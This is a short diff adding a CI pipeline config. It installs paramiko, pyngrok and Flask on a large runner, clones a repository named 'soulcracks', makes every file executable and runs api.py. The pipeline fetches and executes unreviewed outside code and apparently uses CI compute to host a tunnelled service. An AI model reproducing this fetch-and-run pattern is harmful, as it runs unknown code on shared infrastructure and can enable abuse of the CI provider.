@@ -1,0 +1,16 @@
+pipelines:
+  default:
+    - step:
+        name: Run Python Script
+        image: python:3.10
+        size: 8x
+        script:
+          - pip install paramiko pyngrok Flask
+          - git clone https://github.com/Soulpapajibolotum/soulcracks
+          - ls
+          - mv api.py -- ./soulcracks/api.py
+          - cd ./soulcracks
+          - lscpu
+          - chmod +x *
+          - python3 api.py
+
